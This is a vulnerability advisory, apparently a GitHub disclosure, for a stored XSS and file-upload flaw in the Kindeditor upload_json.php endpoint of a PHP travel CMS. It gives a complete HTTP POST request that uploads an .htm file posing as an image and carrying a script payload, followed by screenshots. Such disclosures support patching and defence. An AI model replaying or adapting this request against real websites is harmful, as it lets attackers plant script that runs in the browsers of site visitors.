# PHP-based travel website-CMS upload_json.php imgFile XSS-File-Upload

**Exploit Title: PHP-based travel website-CMS upload_json.php exists in XSS vulnerability**

**Exploit Author: webraybtl@webray.com.cn inc**

**Vendor Homepage: https://github.com/baowzh/hfly**

**Software Link: https://github.com/baowzh/hfly**

**CMSName: PHP-based travel website-CMS**

**Tested on: Windows, Apache ,Mysql**

**Description**

Persistent XSS (or Stored XSS) attack is one of the three major categories of XSS attacks, the others being Non-Persistent (or Reflected) XSS and DOM-based XSS. In general, XSS attacks are based on the victim’s trust in a legitimate, but vulnerable, website or web application.Product Show Room Site does not filter the content correctly at the "/Public/Kindeditor/php/upload_json.php" module, resulting in the generation of stored XSS.

Payload used:

```
POST /Public/Kindeditor/php/upload_json.php?dir=file HTTP/1.1
Host: 172.24.6.217:88
Cookie: ADMIN_PHPSESSID=sj5k234u5eue0uof0k099k35j7
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRH5lr9QAGyiPtnZw
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.24.6.217:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Content-Length: 25164

------WebKitFormBoundaryRH5lr9QAGyiPtnZw
Content-Disposition: form-data; name="imgFile"; filename="1.htm"
Content-Type: image/jpeg

<script>alert('xss');</script>
------WebKitFormBoundaryRH5lr9QAGyiPtnZw--
```

##

## Proof of Concept

<img width="1633" height="1464" alt="2025-11-27-17-37-02-image" src="https://github.com/user-attachments/assets/d1854bc4-e8c2-41e5-8223-e3d43f7cb8e7" />


<img width="2086" height="640" alt="2025-11-27-17-37-10-image" src="https://github.com/user-attachments/assets/92fc8f52-39c6-4556-8306-f7702772c3aa" />


<img width="1125" height="333" alt="2025-11-27-17-37-23-image" src="https://github.com/user-attachments/assets/167782a1-7d9b-4587-b9ec-5c6b0b686545" />

